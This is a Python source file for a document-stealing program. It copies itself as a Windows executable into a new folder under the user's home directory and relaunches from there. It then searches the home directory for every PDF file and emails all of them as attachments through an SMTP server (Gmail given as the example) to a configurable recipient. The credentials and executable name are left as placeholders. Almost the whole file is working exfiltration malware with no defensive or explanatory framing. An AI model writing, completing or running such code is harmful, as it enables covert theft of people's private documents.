import os
import fnmatch
import smtplib
import email.mime.application
import sys
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path


home = str(Path.home())  # Return a string representing the user’s home directory
fileFound = 0  # Number of files found while discovering
fileScanned = 0  # Number of the already processed files
maxSize = 23068672  # Attachments bytes limit for the mail host (22MB in byte, but it can be changed)
actualSizeCounter = 0  # Bytes count for files already attached to the email
paths = []  # List of files directories, matching the pattern, that will be print into the email body

# Following values need to be changed
email_user = "SENDER-ADDRESS-HERE"
email_pwd = "SENDER-PASSWORD-HERE"
recipient = "RECIPIENT-ADDRESS-HERE"

"""
This function will return a list of strings which represents the files path with the specified extension inside the 
specified path
"""


def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result

"""
 __________ START - It may NOT work on MacOS __________
|                                                      |
"""
injecting_folder = home+'\\script'  # 'Injecting' folder
if not os.path.exists(injecting_folder):
    os.system("mkdir %s" % injecting_folder)

executableLocation = find('EXECUTABLE-NAME-HERE.exe', os.path.dirname(os.path.abspath(__file__)))
# Create a new 'injecting' folder where software will copy itself
if not os.path.isfile(injecting_folder + "\\EXECUTABLE-NAME-HERE.exe"):
    os.system("xcopy {!s} {!s} /R".format(executableLocation[0], injecting_folder))

# If current working directory is not the 'injecting' folder opens a new instance from there and close this one.
if os.getcwd() != injecting_folder:
    os.chdir(injecting_folder)
    subprocess.Popen([injecting_folder+'\\EXECUTABLE-NAME-HERE.exe'], stdin=None, stdout=None, stderr=None)
    sys.exit()
"""
 |__________ END - It may NOT work on MacOS __________|
"""

filesFound = find("*.pdf", home)  # List of every pdf file found in every folder starting from the user's home directory

# Building the email structure
msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = recipient
msg['Subject'] = "Files Found"


for f in filesFound:
    fp = open(r'%s' % f, 'rb')
    att = email.mime.application.MIMEApplication(fp.read())
    fp.close()
    paths.append("Directory: " + f)
    att.add_header('Content-Disposition', 'attachment; filename="%s"' % f)
    msg.attach(att)

for p in paths:
    msg.attach(MIMEText(p, 'plain'))

# Open the connection with mail host with specified credentials
server = smtplib.SMTP('smtp.gmail.com', 587)  # These values are just an example working with Gmail, you need to change
# them with your own host's SMTP address and port
server.ehlo()
server.starttls()  # Starts a secure tls connection
server.login(email_user, email_pwd)

email_body = msg.as_string()
server.sendmail(email_user, recipient, email_body)  # Send the email
server.quit()  # Close the connection with host

sys.exit()  # Quit program
